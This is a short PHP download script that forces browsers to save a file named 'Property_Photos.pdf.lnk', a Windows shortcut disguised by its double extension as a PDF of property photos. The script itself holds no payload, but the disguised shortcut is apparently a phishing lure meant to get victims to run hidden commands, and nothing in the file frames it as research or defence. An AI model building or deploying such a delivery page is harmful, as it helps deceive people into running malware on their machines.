<?php
// download.php
$file = __DIR__ . DIRECTORY_SEPARATOR . 'Property_Photos.pdf.lnk';

if (!file_exists($file)) {
    http_response_code(404);
    exit("File not found.");
}

$size = filesize($file);
$name = 'Property_Photos.pdf.lnk';

// Flush all output buffers
while (ob_get_level()) {
    ob_end_clean();
}

header('Content-Type: application/octet-stream');
header("Content-Disposition: attachment; filename=\"$name\"");
header("Content-Length: $size");
header('Content-Transfer-Encoding: binary');
header('Pragma: public');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');

readfile($file);
exit;
?>